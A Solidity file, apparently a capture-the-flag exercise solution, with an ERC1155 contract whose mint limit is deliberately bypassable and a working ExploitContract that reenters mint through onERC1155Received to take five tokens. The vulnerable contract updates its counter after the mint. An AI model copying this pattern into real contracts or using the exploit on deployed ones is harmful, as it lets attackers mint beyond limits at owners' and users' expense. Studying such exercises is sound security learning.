// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import {ERC1155Holder} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;

    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

//ERC1155Holder implements the required `supportsInterface`, `onERC1155Received`,
//and `onERC1155BatchReceived` functions. We can override `onERC1155Received` in the exploit.
contract ExploitContract is ERC1155Holder {
    Overmint1_ERC1155 public overmint1_ERC1155;

    constructor(Overmint1_ERC1155 _overmint1_ERC1155) {
        overmint1_ERC1155 = _overmint1_ERC1155;
    }

    //The `mint` function of the target contract is vulnerable to reentrancy.
    //The amountMinted is not updated correctly before `_mint` is called, which hands
    //control to the receiving contract through `onERC1155Received`. (same mechanism as ERC721).
    //This means we can call `mint` multiple times, and the `amountMinted` will not be updated.
    function attack() public {
        overmint1_ERC1155.mint(0, "");
    }

    function complete() public {
        overmint1_ERC1155.safeTransferFrom(address(this), msg.sender, 0, 5, "");
    }

    function onERC1155Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*id*/
        uint256, /*value*/
        bytes memory /*data*/
    )
        public
        virtual
        override
        returns (bytes4)
    {
        //Reenter victim contract.
        //To complete, we need exactly 5 tokens
        if (overmint1_ERC1155.balanceOf(address(this), 0) != 5) {
            overmint1_ERC1155.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }
}
